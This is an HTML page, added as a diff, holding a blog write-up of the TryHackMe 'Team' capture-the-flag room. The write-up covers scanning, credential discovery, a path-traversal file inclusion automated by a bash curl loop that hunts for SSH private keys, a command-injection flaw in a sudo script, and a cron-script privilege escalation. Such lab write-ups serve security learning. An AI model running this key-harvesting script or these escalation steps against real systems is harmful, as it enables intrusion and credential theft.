@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="Team THM Writeup">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Team TryHackMe Writeup"/>
+<meta name="twitter:description" content="Team THM Writeup"/>
+
+    <meta property="og:title" content="Team TryHackMe Writeup" />
+<meta property="og:description" content="Team THM Writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/team/" />
+<meta property="article:published_time" content="2021-03-11T17:23:30+05:30" />
+<meta property="article:modified_time" content="2021-03-11T17:23:30+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/jpgchat/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/magician/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/watcher/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/inferno/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/enpass/" />
+
+
+
+    <title>
+  Team TryHackMe Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/team/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">$ whoami</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Team TryHackMe Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-03-11T17:23:30&#43;05:30'>
+                March 11, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              4-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/tryhackme/">TryHackMe</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/thm/">thm</a>
+      <span class="separator">•</span>
+    <a href="/tags/easy_box/">easy_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="teamhttpstryhackmecomroomteamcw-tryhackme-writeup"><a href="https://tryhackme.com/room/teamcw">Team</a> TryHackMe Writeup</h1>
+<p><img src="/TryHackMe/Team/BoxImage.png" alt=""></p>
+<h2 id="__first-stage--enumeration__"><strong>First Stage : Enumeration</strong></h2>
+<p>As usual we start with nmap scan to find open ports.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Mon Mar  8 19:59:25 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.65.7
+Nmap scan report for 10.10.65.7
+Host is up, received syn-ack (0.15s latency).
+Scanned at 2021-03-08 19:59:26 IST for 225s
+Not shown: 65532 filtered ports
+Reason: 65532 no-responses
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 3.0.3
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRK/xFh/H4lC7shWUUvK9lKxd3VO2OwfsC8LjFEU2CnEUrbVCnzx8jiVp5gO+CVAj63+GXkbIuXpynlQ/4j1dXdVUz/yAZ96cHiCNo6S5ThONoG2g2ObJSviCX2wBXhUJEzW07mRdtx4nesr6XWMj9hwIlSfSBS2iPEiqHfGrjp14NjG6Xmq5hxZh5Iq3dBrOd/ZZKjGsHe+RElAMzIwRK5NwFlE7zt7ZiANrFSy4YD4zerNSyEnjPdnE6/ArBmqOFtsWKZ2p/Wc0oLOP7d6YBwQyZ9yQNVGYS9gDIGZyQCYsMDVJf7jNvRp/3Ru53FMRcsYm5+ItIrgrx5GbpA+LR
+|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBM4d9TCz3FkEBEJ1VMjOsCrxsbS3YGb7mu9WgtnaFPZs2eG4ssCWz9nWeLolFgvHyT5WxRT0SFSv3vCZCtN86I=
+|   256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUxjoul7JvmqQMtGOuadBwi2mBVCdXhJjoG5x+l+uQn
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add &#39;te...
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Mar  8 20:03:11 2021 -- 1 IP address (1 host up) scanned in 226.37 seconds
+</code></pre></div><p>Hence open ports are :</p>
+<ul>
+<li>22</li>
+<li>80</li>
+</ul>
+<p>So let&rsquo;s visit port 80.</p>
+<p><img src="/TryHackMe/Team/port80.png" alt=""></p>
+<p>So seeing the source code we get that we have to add <strong>team.thm</strong> to our hosts file.</p>
+<p><img src="/TryHackMe/Team/source.png" alt=""></p>
+<p>So going to <a href="http://team.thm">http://team.thm</a> .</p>
+<p><img src="/TryHackMe/Team/team.thm.png" alt=""></p>
+<p>So My next step was gobuster.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===========================================================
+[+] Url:            http://team.thm/
+[+] Threads:        30
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     js,txt,html,php,zip,json
+[+] Timeout:        10s
+===========================================================
+2021/03/08 20:45:17 Starting gobuster
+===========================================================
+/images (Status: 301)
+/scripts (Status: 301)
+/assets (Status: 301)
+/index.html (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+/index.html (Status: 200)
+===========================================================
+2021/03/08 21:20:15 Finished
+===========================================================
+</code></pre></div><p>So after going through many rabbit holes , I got a hint from a friend saying to look at the scripts directory <strong>deeply</strong>.</p>
+<p>Hence I did a gobuster on scripts dir.And got a interesting file.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">===========================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===========================================================
+[+] Url:            http://team.thm/scripts/
+[+] Threads:        30
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     json,js,txt,html,php,zip
+[+] Timeout:        10s
+===========================================================
+2021/03/09 14:50:52 Starting gobuster
+===========================================================
+/script.txt (Status: 200)
+</code></pre></div><p>So going to that file .</p>
+<p><img src="/TryHackMe/Team/scriptnew.png" alt=""></p>
+<p>So we can see that there is an old script which contains username and password , but it&rsquo;s extension is different. Hence I tried some extensions and one extension which worked was <strong>.old</strong>.</p>
+<p><img src="/TryHackMe/Team/scriptold.png" alt=""></p>
+<p>Hence using this I got into ftp.</p>
+<p><img src="/TryHackMe/Team/ftp.png" alt=""></p>
+<p>So going to workshare directory we see that there is a text file called New_site.txt.</p>
+<p><img src="/TryHackMe/Team/newsite.png" alt=""></p>
+<p>So adding dev.team.thm to the hosts file we visit it.</p>
+<p><img src="/TryHackMe/Team/devteam.png" alt=""></p>
+<h2 id="__second-stage--initial-access-as-dale__"><strong>Second Stage : Initial Access as Dale</strong></h2>
+<p>Hence clicking that link gives us the possibility of LFI.</p>
+<p><img src="/TryHackMe/Team/teamshare.png" alt=""></p>
+<p>So I tried /etc/passwd</p>
+<p><img src="/TryHackMe/Team/lfipasswd.png" alt=""></p>
+<p>So from the txt file we got we can see that the id_rsa is in a config file but we don&rsquo;t know what file . Hence I searched for interesting LFI files and got a list of files.</p>
+<blockquote>
+<p><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list">https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list</a></p>
+</blockquote>
+<p>Save the list as paths.txt. And I created a script to automate the lfi process.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0f0;font-weight:bold">#!/bin/bash
+</span><span style="color:#0f0;font-weight:bold"></span>filename=<span style="color:#0ff;font-weight:bold">&#39;paths.txt&#39;</span>
+
+<span style="color:#fff;font-weight:bold">while</span> <span style="color:#fff;font-weight:bold">read</span> line  
+<span style="color:#fff;font-weight:bold">do</span> 
+<span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;[+] Trying </span>$line<span style="color:#0ff;font-weight:bold">&#34;</span>
+curl http://dev.team.thm/script.php<span style="color:#0ff;font-weight:bold">\?</span>page<span style="color:#0ff;font-weight:bold">\=</span>../../../../../../../../$line &gt; result.txt
+<span style="color:#fff;font-weight:bold">if</span> [[ -n <span style="color:#0ff;font-weight:bold">`</span> grep <span style="color:#0ff;font-weight:bold">&#34;OPENSSH&#34;</span> result.txt<span style="color:#0ff;font-weight:bold">`</span>   ]]
+<span style="color:#fff;font-weight:bold">then</span>
+        <span style="color:#fff;font-weight:bold">break</span>
+<span style="color:#fff;font-weight:bold">else</span>
+        <span style="color:#fff;font-weight:bold">continue</span>
+<span style="color:#fff;font-weight:bold">fi</span>
+
+<span style="color:#fff;font-weight:bold">done</span> &lt; $filename
+</code></pre></div><p>After running the script for sometime , it stops at a particular file.</p>
+<p><img src="/TryHackMe/Team/found.png" alt=""></p>
+<p>So if we open the result.txt we get the id_rsa.</p>
+<p><img src="/TryHackMe/Team/id_rsa.png" alt=""></p>
+<p>Hence we can save it and ssh into the machine as dale.</p>
+<p><img src="/TryHackMe/Team/dale.png" alt=""></p>
+<h2 id="__second-stage--dale-to-gyles__"><strong>Second Stage : dale to gyles</strong></h2>
+<p>Since we have sudo permission let&rsquo;s check what is <strong>admin_checks</strong> .</p>
+<p>It is a bash script</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#0f0;font-weight:bold">#!/bin/bash
+</span><span style="color:#0f0;font-weight:bold"></span>
+<span style="color:#fff;font-weight:bold">printf</span> <span style="color:#0ff;font-weight:bold">&#34;Reading stats.\n&#34;</span>
+sleep <span style="color:#ff0;font-weight:bold">1</span>
+<span style="color:#fff;font-weight:bold">printf</span> <span style="color:#0ff;font-weight:bold">&#34;Reading stats..\n&#34;</span>
+sleep <span style="color:#ff0;font-weight:bold">1</span>
+<span style="color:#fff;font-weight:bold">read</span> -p <span style="color:#0ff;font-weight:bold">&#34;Enter name of person backing up the data: &#34;</span> name
+<span style="color:#fff;font-weight:bold">echo</span> $name  &gt;&gt; /var/stats/stats.txt
+<span style="color:#fff;font-weight:bold">read</span> -p <span style="color:#0ff;font-weight:bold">&#34;Enter &#39;date&#39; to timestamp the file: &#34;</span> error
+<span style="color:#fff;font-weight:bold">printf</span> <span style="color:#0ff;font-weight:bold">&#34;The Date is &#34;</span>
+$error 2&gt;/dev/null
+
+date_save=<span style="color:#fff;font-weight:bold">$(</span>date <span style="color:#0ff;font-weight:bold">&#34;+%F-%H-%M&#34;</span><span style="color:#fff;font-weight:bold">)</span>
+cp /var/stats/stats.txt /var/stats/stats-$date_save.bak
+
+<span style="color:#fff;font-weight:bold">printf</span> <span style="color:#0ff;font-weight:bold">&#34;Stats have been backed up\n&#34;</span>
+</code></pre></div><p>After going through some of the rabbit holes I got to know the way to exploit this. The error variable is being executed.</p>
+<p>Hence to exploit this :</p>
+<p><img src="/TryHackMe/Team/gyles.png" alt=""></p>
+<h2 id="__third-stage--gyles-to-root__"><strong>Third Stage : Gyles to root</strong></h2>
+<p>Since gyles was in admin grp I did a search.</p>
+<p><img src="/TryHackMe/Team/script.png" alt=""></p>
+<p>So I downloaded pspy and ran it in the box.</p>
+<p><img src="/TryHackMe/Team/cronjob1.png" alt=""></p>
+<p>So I edited the <strong>main_backup.sh</strong> like this.</p>
+<p><img src="/TryHackMe/Team/editedscript.png" alt=""></p>
+<p>And go root shell back!</p>
+<p><img src="/TryHackMe/Team/root.png" alt=""></p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in TryHackMe</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/jpgchat/">JPGChat TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/magician/">Magician TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/watcher/">Watcher TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/inferno/">Inferno TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/enpass/">Enpass TryHackMe Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
